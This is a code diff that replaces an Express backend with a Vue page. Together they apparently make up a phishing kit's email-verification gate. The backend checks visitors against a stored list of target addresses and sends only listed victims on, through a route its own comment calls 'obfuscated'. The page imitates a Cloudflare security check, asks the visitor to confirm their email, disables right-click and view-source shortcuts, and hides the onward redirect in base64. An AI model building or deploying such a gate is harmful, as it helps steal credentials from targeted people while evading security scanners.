@@ -1,101 +1,100 @@
-require('dotenv').config();
+<template>
+  <div v-if="!captchaToken" class="gate-container">
+    <main>
+      <div class="instructions">
+        <p>Please stand by while we are checking if your connection is secure.</p>
+        <div class="cf-turnstile" data-sitekey="0x4AAAAAABgei6QZruCN7n08"></div>
+      </div>
+    </main>
+  </div>
 
-const express = require('express');
-const cors = require('cors');
-const fs = require('fs');
-const path = require('path');
-const fetch = require('node-fetch');
-const rateLimit = require('express-rate-limit');
+  <div v-else class="background">
+    <div class="email-verify-container">
+      <div class="verify-card">
+        <div class="header">
+          <div class="logo-text">
+            <span class="success-check">⼈</span>
+            <span>Verify Your Access</span>
+          </div>
+        </div>
+        <div class="content">
+          <p><strong>Please confirm your email address to continue.</strong></p>
+          <div class="form-wrapper">
+            <label for="honeypot" class="visually-hidden">Do not fill this field (anti-bot)</label>
+            <input id="honeypot" v-model="honeypot" type="text" style="display: none;" tabindex="-1" autocomplete="off" aria-hidden="true" />
+            <label for="email" class="visually-hidden">Email address</label>
+            <input id="email" v-model="email" type="email" placeholder="Enter your email" required class="email-input" :disabled="loading" />
+            <p v-if="error" class="error" role="alert" aria-live="polite">{{ error }}</p>
+            <button @click="submitForm" :disabled="loading" class="action-button">
+              {{ loading ? 'Submitting…' : 'Submit' }}
+            </button>
+          </div>
+        </div>
+        <div class="divider"></div>
+        <div class="footer-container">
+          <p class="footer-text">© 2025 All rights reserved. <a href="/privacy" target="_blank">Privacy Policy</a> | <a href="/terms" target="_blank">Terms</a></p>
+        </div>
+      </div>
+    </div>
+  </div>
+</template>
 
-const app = express();
-const PORT = process.env.PORT || 3000;
-const EMAIL_FILE = path.join(__dirname, 'ogas', 'oga.txt');
-const REDIRECT_BASE = process.env.REDIRECT_BASE || 'https://yourdomain.com/complete';
+<script setup>
+import { ref, onMounted, nextTick } from 'vue'
+const email = ref('')
+const honeypot = ref('')
+const error = ref('')
+const loading = ref(false)
+const captchaToken = ref(null)
 
-let validEmails = new Set();
-function loadEmails() {
+onMounted(async () => {
+  await nextTick()
+  document.addEventListener('contextmenu', e => e.preventDefault())
+  document.addEventListener('keydown', e => {
+    if (e.ctrlKey && (e.key === 'u' || e.key === 's' || e.key === 'p' || e.key === 'Shift')) {
+      e.preventDefault()
+    }
+  })
+  if (window.turnstile) {
+    window.turnstile.render('.cf-turnstile', {
+      sitekey: '0x4AAAAAABgei6QZruCN7n08',
+      callback: (token) => {
+        captchaToken.value = token
+      }
+    })
+  }
+})
+
+async function submitForm() {
+  error.value = ''
+  loading.value = true
+
   try {
-    const data = fs.readFileSync(EMAIL_FILE, 'utf8');
-    validEmails = new Set(data.split('\n').map(e => e.trim().toLowerCase()));
-    console.log('[INFO] Email list loaded into memory');
-  } catch (err) {
-    console.error('[ERROR] Failed to read email list:', err);
-  }
-}
-loadEmails();
-
-const limiter = rateLimit({
-  windowMs: 60 * 1000,
-  max: 50,
-  message: { valid: false, message: 'Too many requests, try again later.' },
-});
-
-app.use(cors());
-app.use(express.json());
-app.use(limiter);
-
-// ✅ Email check route (used by frontend)
-app.post('/api/check-email', async (req, res) => {
-  const { email, captchaToken, middleName } = req.body;
-
-  // Bot detection
-  if (middleName && middleName.trim() !== '') {
-    return res.status(403).json({ valid: false, message: 'Bot activity detected' });
-  }
-
-  // Basic format check
-  if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
-    return res.status(400).json({ valid: false, message: 'Invalid email format' });
-  }
-
-  // CAPTCHA check
-  if (!captchaToken) {
-    return res.status(400).json({ valid: false, message: 'Captcha missing' });
-  }
-
-  try {
-    const verifyRes = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
+    const res = await fetch(`${import.meta.env.VITE_API_BASE}/api/check-email`, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-      body: `secret=${process.env.CLOUDFLARE_SECRET}&response=${captchaToken}`,
-    });
-    const verifyData = await verifyRes.json();
-    if (!verifyData.success) {
-      return res.status(400).json({ valid: false, message: 'Captcha verification failed' });
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        email: email.value,
+        captchaToken: captchaToken.value,
+        middleName: honeypot.value
+      })
+    })
+
+    const data = await res.json()
+    if (!res.ok || !data.valid) {
+      throw new Error(data.message || 'Verification failed')
+    }
+    if (data.redirectUrl) {
+      const encoded = btoa(data.redirectUrl)
+      window.location.href = `${import.meta.env.VITE_API_BASE}/forward?data=${encoded}`
     }
   } catch (err) {
-    return res.status(500).json({ valid: false, message: 'Captcha verification error' });
+    error.value = err.message
+  } finally {
+    loading.value = false
   }
-
-  const normalizedEmail = email.toLowerCase();
-  const isValid = validEmails.has(normalizedEmail);
-
-  if (!isValid) {
-    return res.status(404).json({ valid: false, message: 'Email not recognized' });
-  }
-
-  const redirectUrl = `${REDIRECT_BASE}?email=${encodeURIComponent(normalizedEmail)}`;
-  return res.json({ valid: true, redirectUrl });
-});
-
-// ✅ Obfuscated redirection route
-app.get('/forward', (req, res) => {
-  try {
-    const { data } = req.query;
-    if (!data) return res.status(400).send('Missing redirect data');
-
-    const decoded = Buffer.from(data, 'base64').toString('utf8');
-    if (!/^https?:\/\//.test(decoded)) return res.status(400).send('Invalid redirect URL');
-
-    res.redirect(decoded);
-  } catch (e) {
-    res.status(400).send('Invalid redirect format');
-  }
-});
-
-app.listen(PORT, () => {
-  console.log(`Backend running on http://localhost:${PORT}`);
-});
+}
+</script>
 
 
 
